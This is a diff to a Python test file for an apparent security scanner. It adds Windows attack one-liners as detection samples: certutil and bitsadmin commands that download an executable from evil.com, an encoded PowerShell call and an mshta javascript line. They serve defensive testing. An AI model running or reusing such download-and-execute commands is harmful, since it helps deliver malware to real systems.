@@ -242,6 +242,11 @@ class TestSafetyChecks:
             ("py_compile.compile(source)\n", "SEC-118"),
             ("require(process.env.MODULE)\n", "SEC-119"),
             ("yaml.load(data, Loader=FullLoader)\n", "SEC-120"),
+            ("openssl pkcs12 -export -out cert.pfx\n", "SEC-121"),
+            ("certutil -urlcache -split -f http://evil.com/x.exe\n", "SEC-122"),
+            ("powershell -enc YWJjZA==\n", "SEC-123"),
+            ("bitsadmin /transfer job http://evil.com/x.exe\n", "SEC-124"),
+            ("mshta javascript:alert(1)\n", "SEC-125"),
         ],
     )
     def test_various_dangerous_patterns(self, tmp_path: Path, content: str, rule_id: str) -> None:
